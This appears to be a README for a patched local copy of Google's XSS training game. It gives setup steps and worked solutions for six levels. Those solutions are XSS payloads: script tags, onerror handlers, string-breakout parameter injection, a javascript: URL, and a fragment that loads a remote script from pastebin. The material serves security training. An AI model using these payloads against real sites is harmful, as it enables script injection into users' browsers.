# CSS-GAME

## Installation:

Install python 2.7 via brew, gzip, anaconda etc.

Install packages:
```
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
python get-pip.py
pip install WebOb
pip install Paste
pip install webapp2
pip install Jinja2
```

## Usage:
Go to level folder e.g. level2 and run `.py` file:
```
cd level2/
python level2.py
```

Check game at http://127.0.0.1:8080 

Origin source: https://xss-game.appspot.com

### Were prevented 6 levels of XSS attacks described below:
### If you want to check initial game where this is working, go to the game site: https://xss-game.appspot.com ###
 # 1 Just insert following code and you're done:
  <script>alert('xss')</script>
 # 2 Use an img tag along with the onerror attribute:
  <\img src="notexist.url" onerror="javascript:alert('xss')"/>
 # 3 Use the onerror attribute to insert JS:
  https://xss-game.appspot.com/level3/frame#3' onerror="alert('xss')";
# 4 Insert the request:
  https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar b=('
# 5 Steps:
  - insert the request:
    https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
  - Click next
# 6 You're not allowed to have a URL containing https. Insert the request to an evil file:
  https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0
